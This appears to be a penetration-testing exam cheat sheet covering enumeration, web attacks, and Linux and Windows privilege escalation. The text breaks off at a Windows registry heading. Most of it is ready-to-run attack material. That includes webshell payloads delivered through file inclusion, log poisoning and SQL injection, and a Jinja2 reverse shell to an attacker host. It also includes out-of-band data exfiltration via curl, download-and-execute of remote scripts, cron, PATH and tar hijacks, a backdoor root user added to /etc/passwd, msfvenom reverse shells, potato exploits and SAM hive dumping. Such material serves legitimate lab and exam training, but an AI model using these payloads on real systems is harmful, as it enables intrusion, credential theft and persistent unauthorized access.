# UNIVERSAL ENUMERATION FRAMEWORK

## Initial Recon — Run in Parallel Immediately

> [!abstract] 🐧 Linux Bash: Initialize Local Workspace Architecture
> 
> Bash
> 
> ```
> mkdir -p ~/exam/{ad,box1,box2,box3}/{scans,loot,exploits,screenshots}
> ```

> [!check] 🐧 Linux Bash: Parallel Quick Target Service Mapping
> 
> Bash
> 
> ```
> for ip in <MS01_IP> <MS02_IP> <DC_IP> <BOX1_IP> <BOX2_IP> <BOX3_IP>; do
>     nmap -sV --open -T4 $ip -oN ~/exam/scans/quick_$ip.txt &
> done
> wait
> ```

> [!info] 🐧 Linux Bash: Full TCP Port Scan per Machine
> 
> Bash
> 
> ```
> nmap -p- -sV -sC --open -T4 <TARGET_IP> -oN full_tcp.txt
> ```

> [!warning] 🐧 Linux Bash: Top 20 UDP Ports Scan (Don't Skip Critical Protocols)
> 
> Bash
> 
> ```
> nmap -sU --top-ports 20 <TARGET_IP> -oN udp.txt
> ```

## Port ➔ Action Decision Tree

> [!quote] 🌳 Mappings: Protocol-to-Action Blueprint Matrix
> 
> Plaintext
> 
> ```
> PORT    SERVICE     → IMMEDIATE ACTION
> ────────────────────────────────────────────────────────────────
> 21      FTP         → ftp <IP> (try anonymous:anonymous)
>                       check banner version → searchsploit
> 22      SSH         → note version; use creds found later
>                       id_rsa files? ssh -i key user@<IP>
> 23      Telnet      → telnet <IP>; try default creds
> 25      SMTP        → smtp-user-enum -M VRFY -U users.txt -t <IP>
>                       check open relay; sendmail exploits
> 53      DNS         → dig axfr @<IP> <domain>
>                       dnsrecon -d <domain> -t axfr
> 80/443  HTTP/S      → [SEE WEB ENUMERATION BELOW]
> 88      Kerberos    → AD confirmed! AS-REP roast immediately
> 111     RPC/NFS     → showmount -e <IP>; mount + explore
> 135     MSRPC       → Windows; rpcclient -U "" -N <IP>
> 139/445 SMB         → [SEE SMB ENUMERATION BELOW]
> 161     SNMP UDP    → snmpwalk -c public -v1 <IP>
>                       onesixtyone -c community.txt <IP>
> 389/636 LDAP        → ldapsearch anonymous; AD enumeration
> 1433    MSSQL       → [SEE MSSQL SECTION 6]
> 3306    MySQL       → mysql -u root -h <IP> (blank/default pass)
> 3389    RDP         → check ms17-010, bluekeep; use creds later
> 4444+   Custom      → nc <IP> <PORT>; banner grab; searchsploit
> 5985    WinRM       → evil-winrm -i <IP> -u user -p pass
> 8080    Alt-HTTP    → Tomcat? Jenkins? Weblogic? check /manager
> 8443    Alt-HTTPS   → same as above; check SSL cert for hostnames
> ```

## Web Enumeration Workflow

> [!info] 🐧 Linux Bash: Tech Fingerprint & Response Headers Identification
> 
> Bash
> 
> ```
> whatweb http://<TARGET_IP> -v
> curl -I http://<TARGET_IP>
> ```

> [!info] 🐧 Linux Bash: Automated Web Server Vulnerability Scan
> 
> Bash
> 
> ```
> nikto -h http://<TARGET_IP> -output nikto.txt &
> ```

> [!check] 🐧 Linux Bash: Large-Scale Directory Web-Content Brute Force
> 
> Bash
> 
> ```
> gobuster dir -u http://<TARGET_IP> \
>     -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt \
>     -x php,html,txt,asp,aspx,jsp,do,py -t 50 -o gobuster.txt
> ```

> [!check] 🐧 Linux Bash: Advanced Recursive Multi-Threaded Content Brute Force
> 
> Bash
> 
> ```
> feroxbuster -u http://<TARGET_IP> \
>     -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
>     -x php,html,txt,aspx -t 100 --depth 3 -o ferox.txt
> ```

> [!note] 🐧 Linux Bash: Sensitive Endpoints & Hardcoded Credentials Manual Checking
> 
> Bash
> 
> ```
> curl http://<TARGET_IP>/robots.txt
> curl http://<TARGET_IP>/.git/HEAD         # Git repo exposed?
> curl http://<TARGET_IP>/.env              # Credentials?
> curl http://<TARGET_IP>/backup/           # Backup files?
> curl http://<TARGET_IP>/config.php        # DB creds?
> curl http://<TARGET_IP>/.htaccess
> ```

> [!note] 🌐 Browser: Page Comments & Inline Source Inspection Check
> 
> Plaintext
> 
> ```
> view-source:http://<TARGET_IP>/           # HTML comments with creds!
> ```

> [!check] 🐧 Linux Bash: Virtual Host & Subdomain Identity Spraying
> 
> Bash
> 
> ```
> gobuster vhost -u http://<DOMAIN> \
>     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
>     --append-domain -t 50 -o vhosts.txt
> ```

> [!check] 🐧 Linux Bash: Automated WordPress Core & Installed Plugins Audit
> 
> Bash
> 
> ```
> wpscan --url http://<TARGET_IP> --enumerate u,p,t,cb,dbe --plugins-detection aggressive
> ```

> [!check] 🐧 Linux Bash: Automated Joomla CMS Structure Scan
> 
> Bash
> 
> ```
> joomscan -u http://<TARGET_IP>
> ```

> [!check] 🐧 Linux Bash: Automated Drupal CMS Architecture Tracker
> 
> Bash
> 
> ```
> droopescan scan drupal -u http://<TARGET_IP>
> ```

> [!check] 🐧 Linux Bash: Web Request Parameter Fuzzing for Vulnerability Detection
> 
> Bash
> 
> ```
> ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
>     -u "http://<TARGET_IP>/page.php?FUZZ=test" -fs 0 -mc 200,301,302,500
> ```

## SMB Enumeration

> [!info] 🐧 Linux Bash: Unauthenticated baseline Null Session Check
> 
> Bash
> 
> ```
> smbclient -L //<TARGET_IP> -N
> ```

> [!info] 🐧 Linux Bash: Null Session Share Mapping Access Permissions Check
> 
> Bash
> 
> ```
> smbmap -H <TARGET_IP> -u '' -p ''
> ```

> [!check] 🐧 Linux Bash: Unauthenticated Null Session Domain Reconnaissance Modules
> 
> Bash
> 
> ```
> crackmapexec smb <TARGET_IP> -u '' -p '' --shares
> ```

> [!check] 🐧 Linux Bash: Guest User Account Authorization Permissions Scan
> 
> Bash
> 
> ```
> crackmapexec smb <TARGET_IP> -u 'guest' -p '' --shares
> ```

> [!warning] 🐧 Linux Bash: Scripted SMB Engine Common Security Weakness Scans
> 
> Bash
> 
> ```
> nmap --script smb-vuln* -p 445 <TARGET_IP>
> ```

> [!warning] 🐧 Linux Bash: Targeted Legacy Core Memory Corruption Check (MS17-010)
> 
> Bash
> 
> ```
> nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>
> ```

> [!check] 🐧 Linux Bash: Authenticated Domain Objects, Policy, & Shares Discovery
> 
> Bash
> 
> ```
> crackmapexec smb <TARGET_IP> -u user -p pass --shares --users --groups --pass-pol
> ```

> [!info] 🐧 Linux Bash: Recursive Listing of Writable Target Shares Partitions
> 
> Bash
> 
> ```
> smbmap -H <TARGET_IP> -u user -p pass -R           # Recursive listing
> ```

> [!info] 🐧 Linux Bash: Manual Interactive Authenticated Share Drive Connection
> 
> Bash
> 
> ```
> smbclient //<TARGET_IP>/share -U 'user%pass'
> ```

--- Memorialized exactly from raw source code line notes:

> [!note] 🐧 Linux Bash: Recursive Mass Extraction and Download of Share Contents
> 
> Bash
> 
> ```
> smbclient //<TARGET_IP>/SHARE -U 'user%pass' -c 'recurse ON; prompt OFF; mget *'
> ```

> [!check] 🐧 Linux Bash: Spidering Shared Files for Hardcoded Configuration Strings
> 
> Bash
> 
> ```
> crackmapexec smb <TARGET_IP> -u user -p pass -M spider_plus
> ```

## SNMP Enumeration

> [!check] 🐧 Linux Bash: Community String Dictionary Bruteforce Scan
> 
> Bash
> 
> ```
> onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <TARGET_IP>
> ```

> [!info] 🐧 Linux Bash: Full MIB Sub-Tree Walk (SNMPv1 Profile Endpoint)
> 
> Bash
> 
> ```
> snmpwalk -c public -v1 <TARGET_IP>
> ```

> [!info] 🐧 Linux Bash: OID Active Process Space Extraction Tree Scan
> 
> Bash
> 
> ```
> snmpwalk -c public -v2c <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.2   # Running processes
> ```

> [!info] 🐧 Linux Bash: OID Installed Software Application Inventory Scan
> 
> Bash
> 
> ```
> snmpwalk -c public -v2c <TARGET_IP> 1.3.6.1.2.1.25.6.3.1.2   # Installed software
> ```

> [!info] 🐧 Linux Bash: OID Windows Domain System Accounts Collection
> 
> Bash
> 
> ```
> snmpwalk -c public -v2c <TARGET_IP> 1.3.6.1.4.1.77.1.2.25    # Windows users
> ```

> [!check] 🐧 Linux Bash: Scripted Engine Configuration Report Mapping
> 
> Bash
> 
> ```
> snmp-check <TARGET_IP> -c public
> ```

# 3. STANDALONE LINUX BOX METHODOLOGY

## Decision Tree — Linux Initial Access

> [!abstract] 🌳 Logic Diagram: Linux System Assessment Entry Path Blueprint
> 
> Plaintext
> 
> ```
> NMAP OUTPUT ANALYSIS
> │
> ├── Web Port (80/443/8080)?
> │   ├── Directory enum → /admin, /backup, /upload, /dev found?
> │   ├── CMS? → WPScan/Joomscan → plugin CVE / auth bypass
> │   ├── Login page? → default creds, SQLi, brute force
> │   ├── File upload? → bypass → webshell
> │   ├── LFI/RFI? → log poison → RCE
> │   ├── SSTI? → Jinja2/Twig RCE
> │   ├── SQLi? → file write → webshell
> │   ├── Command injection in params?
> │   └── Version-specific CVE? → searchsploit
> │
> ├── FTP (21)?
> │   ├── Anonymous login → look for writable dir overlapping with webroot
> │   └── Upload PHP shell → trigger via browser
> │
> ├── SSH (22)? → need creds; check other services first
> │
> ├── NFS (111/2049)?
> │   └── showmount -e → mount → look for .ssh, creds, writable dirs
> │
> └── SNMP (161 UDP)?
>     └── community string → dump info → find creds/usernames
> ```

## Linux Web Attack Techniques

> [!example] 🌐 URL Ingress: Arbitrary File System Traversal Verification
> 
> Plaintext
> 
> ```
> /page.php?file=../../../../etc/passwd
> /page.php?file=../../../../etc/shadow    # if lucky
> /page.php?file=/proc/self/environ        # environment vars
> ```

> [!example] 🌐 URL Ingress: Base64 Decoded PHP Filter Source Code Disclosures
> 
> Plaintext
> 
> ```
> /page.php?file=php://filter/convert.base64-encode/resource=config.php
> ```

> [!example] 🌐 URL Ingress: Execution of Arbitrary In-Memory PHP Payload Wrappers
> 
> Plaintext
> 
> ```
> /page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
> ```

> [!example] 🐧 Linux Bash: Apache/Nginx Web Log Poisoning via User-Agent String Injections
> 
> Bash
> 
> ```
> curl -A '<?php system($_GET["cmd"]); ?>' http://<TARGET_IP>/
> ```

> [!example] 🌐 URL Ingress: Executing a Weaponized Local Web Access Log Container
> 
> Plaintext
> 
> ```
> /page.php?file=/var/log/apache2/access.log&cmd=id
> ```

> [!example] 🐧 Linux Bash: SSH Authentication Error Streams In-Memory Log Poisoning
> 
> Bash
> 
> ```
> ssh '<?php system($_GET["cmd"]); ?>'@<TARGET_IP>
> ```

> [!example] 🌐 URL Ingress: Context Verification Execution for Poisoned Secondary Log Channels
> 
> Plaintext
> 
> ```
> /page.php?file=/var/log/auth.log&cmd=whoami
> ```

> [!example] 🌐 URL Ingress: SQL Injection Authentication Bypass Core Triage Test
> 
> Plaintext
> 
> ```
> ' OR '1'='1'-- -
> ```

> [!example] 🌐 URL Ingress: Manual SQL Injection Union-Based System File Read Execution
> 
> Plaintext
> 
> ```
> ' UNION SELECT 1,load_file('/etc/passwd'),3-- -
> ```

> [!example] 🌐 URL Ingress: SQL Injection Backdoor Webshell Delivery via Arbitrary Output Files
> 
> Plaintext
> 
> ```
> ' UNION SELECT 1,"<?php system($_GET['cmd']); ?>",3 INTO OUTFILE '/var/www/html/cmd.php'-- -
> ```

> [!check] 🐧 Linux Bash: Automated Web Database Injection Exploration and Backdoor Shell Spawning
> 
> Bash
> 
> ```
> sqlmap -u "http://<TARGET_IP>/login.php" --data="user=admin&pass=x" --level=5 --risk=3 --dbs
> sqlmap -u "http://<TARGET_IP>/item?id=1" --os-shell   # Try for direct shell
> ```

> [!check] 🐧 Linux Bash: Automated File System Write Manipulations via SQL Application Weaknesses
> 
> Bash
> 
> ```
> sqlmap -u "http://<TARGET_IP>/item?id=1" --file-write=/tmp/shell.php --file-dest=/var/www/html/shell.php
> ```

> [!abstract] 🌳 Markdown List: Arbitrary File Upload Bypass Structural Extensions Checklist
> 
> Plaintext
> 
> ```
> # 1. MIME type: Change Content-Type to image/jpeg
> # 2. Magic bytes prepend: GIF89a
> # 3. Double extension: shell.php.jpg, shell.php%00.jpg
> # 4. Case variation: shell.pHp, shell.PHP
> # 5. Alt extensions: .php3, .php4, .php5, .phtml, .phar, .shtml
> # 6. Blacklist bypass: .php7, .inc
> # 7. Null byte (older): shell.php%00.gif
> ```

> [!example] 🌐 Template String: Server-Side Template Injection Core Component Detection String Checks
> 
> Plaintext
> 
> ```
> {{7*7}}       → 49 = Jinja2/Twig
> ${7*7}        → 49 = FreeMarker/Mako
> <%= 7*7 %>    → 49 = ERB (Ruby)
> #{7*7}        → 49 = Ruby/Pebble
> ```

> [!example] 🌐 Template String: Python Jinja2 Engine Native Sandboxed Remote Code Execution Payloads
> 
> Plaintext
> 
> ```
> {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
> {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
> ```

> [!example] 🌐 Template String: Jinja2 Payload Forcing Reverse Bash Terminal Ingress Streams
> 
> Plaintext
> 
> ```
> {{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/<LHOST>/4444 0>&1"').read()}}
> ```

> [!example] 🌐 Template String: Twig Server-Side Template Engine Arbitrary Code Injection Payloads
> 
> Plaintext
> 
> ```
> {{['id']|filter('system')}}
> {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
> ```

> [!example] 🌐 URL Ingress: Command Injection Native Operational Parameter Chaining Checks
> 
> Plaintext
> 
> ```
> ping=127.0.0.1; whoami
> ping=127.0.0.1|whoami
> ping=127.0.0.1`whoami`
> ```

> [!example] 🌐 URL Ingress: Out-Of-Bounds (OOB) Cryptographic Command Injection Exfiltration Streams
> 
> Plaintext
> 
> ```
> ping=127.0.0.1; curl http://<LHOST>/?x=$(id|base64)
> ```

## Linux Privilege Escalation Checklist

## STEP 1 — AUTOMATED (always run immediately after shell)

> [!abstract] 🐧 Linux Bash: Attacker Web Delivery Platform Launch Configuration
> 
> Bash
> 
> ```
> python3 -m http.server 80
> ```

> [!check] 🐧 Linux Bash: Piping Remote Inbound System Audit Scripts to Target Executions
> 
> Bash
> 
> ```
> curl http://<LHOST>/linpeas.sh | bash 2>/dev/null | tee /tmp/linpeas.out
> ```

## STEP 2 — MANUAL CHECKS (don't skip even after linpeas)

## ── Context ──────────────────────────────────────────────────

> [!info] 🐧 Linux Bash: Active Session User Token & Machine Identification Configuration
> 
> Bash
> 
> ```
> whoami && id && hostname
> ```

> [!info] 🐧 Linux Bash: Kernel Environment & Operating Distribution Version Verification
> 
> Bash
> 
> ```
> uname -a && cat /etc/os-release
> ```

> [!note] 🐧 Linux Bash: Extracting In-Memory Plaintext Secrets from Environment Arrays
> 
> Bash
> 
> ```
> env | grep -i "pass\|key\|secret\|token"
> ```

> [!note] 🐧 Linux Bash: Interrogating User History Trails Containers for Plaintext Passwords
> 
> Bash
> 
> ```
> cat ~/.bash_history
> cat /home/*/.bash_history 2>/dev/null
> ```

## ── Sudo ─────────────────────────────────────────────────────

> [!check] 🐧 Linux Bash: Query Authorized Root Sudo Program Mappings
> 
> Bash
> 
> ```
> sudo -l
> ```

> [!example] 🐧 Linux Bash: Elevated Sudo Interactive Tool Breakouts (GTFObins Find Command Path)
> 
> Bash
> 
> ```
> sudo find . -exec /bin/bash \; -p
> ```

> [!example] 🐧 Linux Bash: Elevated Sudo In-Memory Program Scripting Escape (GTFObins Python Framework)
> 
> Bash
> 
> ```
> sudo python3 -c 'import os; os.system("/bin/bash")'
> ```

> [!example] 🐧 Linux Bash: Elevated Sudo Local Text Editor Workspace Shell Breakout (GTFObins Vim Core)
> 
> Bash
> 
> ```
> sudo vim → :!/bin/bash
> ```

> [!example] 🐧 Linux Bash: Elevated Sudo Pattern Parsing Terminal Escalation (GTFObins Awk Integration)
> 
> Bash
> 
> ```
> sudo awk 'BEGIN {system("/bin/bash")}'
> ```

> [!example] 🐧 Linux Bash: Elevated Sudo Environment Configuration Passing Shell Breakout
> 
> Bash
> 
> ```
> sudo env /bin/bash
> ```

> [!example] 🐧 Linux Bash: Compiling and Weaponizing Writable Preloaded Shared Library Configurations
> 
> Bash
> 
> ```
> gcc -fPIC -shared -o /tmp/pe.so pe.c -nostartfiles
> sudo LD_PRELOAD=/tmp/pe.so <allowed_binary>
> ```

## ── SUID/GUID ────────────────────────────────────────────────

> [!check] 🐧 Linux Bash: Comprehensive Root SUID and GUID Permissions File Location Queries
> 
> Bash
> 
> ```
> find / -perm -4000 -type f 2>/dev/null | xargs ls -la
> find / -perm -2000 -type f 2>/dev/null | xargs ls -la
> ```

## ── Capabilities ────────────────────────────────────────────

> [!check] 🐧 Linux Bash: System Extended File Partition Capability Allocations Search Scan
> 
> Bash
> 
> ```
> getcap -r / 2>/dev/null
> ```

## ── Cron Jobs ────────────────────────────────────────────────

> [!check] 🐧 Linux Bash: Auditing Automated Daemon Crontab Schedules & Routine Script Scripts
> 
> Bash
> 
> ```
> cat /etc/crontab
> ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/
> crontab -l
> cat /var/spool/cron/crontabs/* 2>/dev/null
> ```

> [!example] 🐧 Linux Bash: Weaponizing Wildcard Expansion Traversal Anomalies inside Tar Automations
> 
> Bash
> 
> ```
> echo "" > '--checkpoint=1'
> echo "" > '--checkpoint-action=exec=bash shell.sh'
> echo 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1' > shell.sh
> ```

## ── Services running as root ─────────────────────────────────

> [!check] 🐧 Linux Bash: Identifying Active Daemon Threads Bound to Root Contexts
> 
> Bash
> 
> ```
> ps aux | grep root | grep -v "\[" | grep -v "kthreadd"
> ss -tlnp   # local-only services (only accessible from victim)
> ```

## ── Writable files ──────────────────────────────────────────

> [!check] 🐧 Linux Bash: Searching System Storage Paths for Writable File Vulnerabilities
> 
> Bash
> 
> ```
> find / -writable -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" -type f 2>/dev/null
> ```

> [!example] 🐧 Linux Bash: Local Root Account Injection via Writable Passwd File Targets
> 
> Bash
> 
> ```
> openssl passwd -1 haxpass      # generates hash
> echo 'hax:$1$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
> su hax   # password: haxpass
> ```

## ── NFS no_root_squash ──────────────────────────────────────

> [!check] 🐧 Linux Bash: Auditing Network File System Mount Point Export System Tables
> 
> Bash
> 
> ```
> cat /etc/exports
> ```

> [!example] 🐧 Linux Bash: Forcing Privilege Escalation over Shared Storage Units (NFS Root Squashing Hijack)
> 
> Bash
> 
> ```
> # Executed on Attacker Machine as Root:
> mkdir /mnt/nfs
> mount -t nfs <TARGET_IP>:/share /mnt/nfs
> cp /bin/bash /mnt/nfs/
> chmod +s /mnt/nfs/bash     # set SUID as root
> ```

> [!example] 🐧 Linux Bash: Initializing the Local SUID Shell Partition on Compromised Victim Terminal
> 
> Bash
> 
> ```
> /tmp/bash -p               # spawns root shell
> ```

## ── Docker ──────────────────────────────────────────────────

> [!check] 🐧 Linux Bash: Confirm Containerization Engine Group Identity Status Mapping
> 
> Bash
> 
> ```
> id | grep -i docker
> groups | grep -i docker
> ```

> [!example] 🐧 Linux Bash: Breaking Container Sandboxes via Privilege Local Drive Partition Volumes Mounting
> 
> Bash
> 
> ```
> docker run -v /:/mnt --rm -it alpine chroot /mnt sh
> ```

## ── PATH Hijacking ──────────────────────────────────────────

> [!check] 🐧 Linux Bash: Identifying Relative Executable Calls inside Root Scripts Binaries
> 
> Bash
> 
> ```
> strings /usr/local/sbin/rootscript | grep -v "/"
> ```

> [!example] 🐧 Linux Bash: Injecting Malicious Local Executables for Path Redirection Privilege Hijacks
> 
> Bash
> 
> ```
> echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<LHOST>/4444 0>&1' > /tmp/service
> chmod +x /tmp/service
> export PATH=/tmp:$PATH
> ```

## ── Interesting Files ────────────────────────────────────────

> [!note] 🐧 Linux Bash: Global Document Tree File Search Extensions Tracker
> 
> Bash
> 
> ```
> find / -name "*.conf" -o -name "*.config" -o -name "*.xml" \
>     -o -name "*.ini" -o -name "*.bak" -o -name "*.old" \
>     -o -name "*.zip" -o -name "*.db" -o -name "*.kdbx" \
>     2>/dev/null | grep -v proc | grep -v sys | head -50
> ```

> [!note] 🐧 Linux Bash: Targeted Text File Content Regex Searches for Passwords
> 
> Bash
> 
> ```
> grep -r "password\|passwd\|pwd\|secret\|token\|key" \
>     /var/www/html/ /opt/ /home/ /etc/ 2>/dev/null | grep -v ".pyc"
> ```

> [!note] 🐧 Linux Bash: Target Traversal Extraction for SSH Cryptographic Identity Keys
> 
> Bash
> 
> ```
> find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
> ```

## ── Kernel Exploits (LAST RESORT) ────────────────────────────

> [!info] 🐧 Linux Bash: Ingress Mapping of Current Core Kernel Release Flags
> 
> Bash
> 
> ```
> uname -r
> ```

> [!check] 🐧 Linux Bash: Programmatic Local Database Query for Public Kernel Exploits Scripts
> 
> Bash
> 
> ```
> searchsploit linux kernel $(uname -r | cut -d- -f1)
> ```

## Linux PrivEsc Decision Tree

> [!quote] 🌳 Logic Diagram: Linux System Local Privilege Elevation Sequence Mapping
> 
> Plaintext
> 
> ```
> sudo -l → any NOPASSWD?
>     └── GTFObins → ROOT ✓
> 
> SUID binary found?
>     ├── Known binary in GTFObins → ROOT ✓
>     ├── Custom binary → strings/ltrace → PATH hijack?
>     └── Relative path call → inject malicious binary → ROOT ✓
> 
> Capabilities found?
>     └── cap_setuid → setuid(0) → ROOT ✓
> 
> Cron writable script?
>     └── Append reverse shell → ROOT ✓
> 
> Cron wildcard (tar/rsync)?
>     └── Wildcard injection → ROOT ✓
> 
> /etc/passwd writable?
>     └── Add root user → ROOT ✓
> 
> NFS no_root_squash?
>     └── Mount + SUID bash → ROOT ✓
> 
> Docker group?
>     └── docker run -v /:/mnt → chroot → ROOT ✓
> 
> Internal service (ss -tlnp) as root?
>     └── Port forward → exploit locally → ROOT ✓
> 
> Nothing? → Kernel exploit (check exact version)
> ```

# 4. STANDALONE WINDOWS BOX METHODOLOGY

## Decision Tree — Windows Initial Access

> [!abstract] 🌳 Logic Diagram: Windows Corporate Sub-System Entry Ingress Blueprint
> 
> Plaintext
> 
> ```
> NMAP OUTPUT
> │
> ├── SMB (445)?
> │   ├── null session → shares → interesting files → creds
> │   ├── MS17-010 vulnerable? → EternalBlue → SYSTEM
> │   └── Guest/found creds → PSExec/WMIexec
> │
> ├── Web (80/443/8080)?
> │   ├── Same as Linux web attacks
> │   ├── IIS? → check /aspnet_client, WebDAV
> │   └── Tomcat? → /manager/html → deploy WAR shell
> │
> ├── MSSQL (1433)?
> │   └── [SEE SECTION 6 — FULL MSSQL CHAIN]
> │
> ├── WinRM (5985)?
> │   └── evil-winrm -i <TARGET_IP> -u user -p pass
> │
> ├── RDP (3389)?
> │   ├── BlueKeep (Win7/2008)?
> │   └── Use found creds: rdesktop / xfreerdp
> │
> └── FTP (21)?
>     └── anonymous + writable + webroot overlap → upload ASPX shell
> ```

## Windows Initial Access Commands

> [!warning] 🐧 Linux Bash: Target Legacy Endpoint Null Session Vulnerability Scan (MS17-010)
> 
> Bash
> 
> ```
> nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>
> ```

> [!example] 🐧 Linux Bash: Execution of Manual Shellcode Overrides for Legacy SMB Targets
> 
> Bash
> 
> ```
> python3 ms17_010_shellcode.py <TARGET_IP>    # manual
> ```

> [!example] 🐧 Linux Bash: Creating Backdoor Tomcat Manager Deployment WAR Payloads
> 
> Bash
> 
> ```
> msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f war -o shell.war
> ```

> [!example] 🐧 Linux Bash: Delivering Backdoor WAR Archives through Inbound HTTP Put Methods
> 
> Bash
> 
> ```
> curl -u admin:admin -T shell.war "http://<TARGET_IP>:8080/manager/text/deploy?path=/shell"
> curl http://<TARGET_IP>:8080/shell/
> ```

> [!check] 🐧 Linux Bash: Automated Scripted Inspection of Target WebDAV Endpoints Writable Status
> 
> Bash
> 
> ```
> davtest -url http://<TARGET_IP>
> cadaver http://<TARGET_IP>
> ```

> [!example] 🐧 Linux Bash: Generating Malicious ASPX Windows Architecture Ingress Web-Shell Payloads
> 
> Bash
> 
> ```
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f aspx -o shell.aspx
> ```

> [!example] 🐧 Linux Bash: Uploading Weaponized ASPX Vectors to Targets Writable Directories
> 
> Bash
> 
> ```
> curl -T shell.aspx http://<TARGET_IP>/uploads/shell.aspx
> ```

> [!example] 🐧 Linux Bash: Authenticated WinRM Remote Console Shell Access Connection
> 
> Bash
> 
> ```
> evil-winrm -i <TARGET_IP> -u Administrator -p 'Password123'
> ```

> [!example] 🐧 Linux Bash: Authenticated WinRM Remote Access via Discovery NT Hashes Strings
> 
> Bash
> 
> ```
> evil-winrm -i <TARGET_IP> -u Administrator -H <NTLM_HASH>
> ```

## Windows Privilege Escalation Checklist

## STEP 1 — AUTOMATED

> [!abstract] 🐧 Linux Bash: Attacker Web Delivery Platform Launch Operations
> 
> Bash
> 
> ```
> python3 -m http.server 80
> ```

> [!check] 💾 Windows CMD: Requesting Remote Executables Downloads and Local Output Logs Pipe Scripts
> 
> DOS
> 
> ```
> powershell -c "Invoke-WebRequest http://<LHOST>/winPEASany.exe -OutFile C:\Windows\Temp\wp.exe"
> C:\Windows\Temp\wp.exe > C:\Windows\Temp\out.txt 2>&1
> type C:\Windows\Temp\out.txt
> ```

> [!check] 🪟 PowerShell: Automated Scripted Registry, Service, and System Permissions Ingress Audit
> 
> PowerShell
> 
> ```
> powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1'); Invoke-AllChecks"
> ```

## STEP 2 — MANUAL CHECKS

## ── Context ─────────────────────────────────────────────────

> [!info] 💾 Windows CMD: Query Account Token Privileges and System Groups Assignments Registry Maps
> 
> DOS
> 
> ```
> whoami /all          # Full token + privileges — READ THIS CAREFULLY
> ```

> [!info] 💾 Windows CMD: Extracting System Environment Blueprints, Architecture, and Operational Metrics
> 
> DOS
> 
> ```
> systeminfo           # OS version, hotfixes → patch level
> wmic qfe list brief  # Installed KB patches
> ```

## ── Token Privileges (check whoami /priv) ────────────────────

> [!example] 💾 Windows CMD: Token Privilege Impersonation over Native Operating Assemblies (SeImpersonate Core)
> 
> DOS
> 
> ```
> .\GodPotato-NET4.exe -cmd "cmd /c whoami > C:\Windows\Temp\proof.txt"
> ```

> [!example] 💾 Windows CMD: Injecting Persistent Local Admin User Entities via Elevated Impersonation Handles
> 
> DOS
> 
> ```
> .\GodPotato-NET4.exe -cmd "cmd /c net user hax Password123! /add && net localgroup administrators hax /add"
> ```

> [!example] 💾 Windows CMD: Generating High-Privilege Local Process Call Handles inside PrintSpoofer Exploitations
> 
> DOS
> 
> ```
> .\PrintSpoofer64.exe -i -c "cmd /c whoami"
> .\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe <LHOST> 4444 -e cmd"
> ```

> [!example] 💾 Windows CMD: Accessing elevated SYSTEM Context Threads via Alternative Ingress Frameworks
> 
> DOS
> 
> ```
> .\JuicyPotatoNG.exe -t * -p "C:\Windows\Temp\nc.exe" -a "<LHOST> 4444 -e cmd"
> ```

> [!example] 💾 Windows CMD: Harvesting Active System Account Registry Hive Backup Databases (SeBackup Vector)
> 
> DOS
> 
> ```
> reg save HKLM\SAM C:\Temp\SAM
> reg save HKLM\SYSTEM C:\Temp\SYSTEM
> reg save HKLM\SECURITY C:\Temp\SECURITY
> ```

> [!check] 🐧 Linux Bash: Remote Decryption of Local Registry Hives Database Secrets
> 
> Bash
> 
> ```
> secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
> ```

## ── Services ────────────────────────────────────────────────

> [!note] 💾 Windows CMD: Global Querying of Running Processes for Unquoted Service Paths Vulnerabilities
> 
> DOS
> 
> ```
> wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"
> ```

> [!check] 💾 Windows CMD: Identifying Weak Security Permissions and Modification Access over Active Services
> 
> DOS
> 
> ```
> accesschk.exe -uwcqv * /accepteula 2>nul | findstr "RW\|WD"
> ```

> [!example] 💾 Windows CMD: Swapping Service Executables to Trigger Elevated Backdoor Shell Processing
> 
> DOS
> 
> ```
> sc stop <SERVICE_NAME>
> copy shell.exe "C:\path\to\service.exe"
> sc start <SERVICE_NAME>
> ```

> [!check] 💾 Windows CMD: Querying Target Users Service Manipulation Permission Mappings
> 
> DOS
> 
> ```
> accesschk.exe -uwcqv "<USERNAME>" * /accepteula
> ```

> [!example] 💾 Windows CMD: Overriding Weak Service Configuration Paths for Local Admin Group Escalation Loops
> 
> DOS
> 
> ```
> sc config <SERVICE_NAME> binpath= "cmd /c net user hax Pass123! /add"
> sc stop <SERVICE_NAME> && sc start <SERVICE_NAME>
> sc config <SERVICE_NAME> binpath= "cmd /c net localgroup administrators hax /add"
> sc stop <SERVICE_NAME> && sc start <SERVICE_NAME>
> ```

## ── Registry ────────────────────────────────────────────────

> [!check] 💾 Windows CMD: Auditing Registry Flag Keys for Arbitrary Installer Packages Elevation Streaks
> 
> DOS
> 
> ```
> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
> ```

> [!example] 🐧 Linux Bash: Crafting Malicious Installation Database Packages for Registry Privilege Exploitations
